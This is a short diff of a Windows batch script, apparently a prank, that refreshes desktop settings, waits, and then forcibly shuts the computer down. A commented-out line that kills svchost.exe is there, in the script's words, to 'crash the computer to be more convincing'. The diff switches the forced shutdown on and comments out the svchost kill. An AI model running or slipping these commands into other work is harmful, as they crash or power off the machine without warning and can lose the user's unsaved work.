@@ -52,7 +52,7 @@ RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
 timeout /t 7
 
 :: /r for restart, /s for shutdown
-::shutdown /s -f -t 0
+shutdown /s -f -t 0s
 
-:: Outright crash the computer to be more convincing
-taskkill.exe /f /im svchost.exe
+:: Outright crash the computer to be more convincing. NOTE: Corrupts the HAHALOL.txt file
+::taskkill.exe /f /im svchost.exe
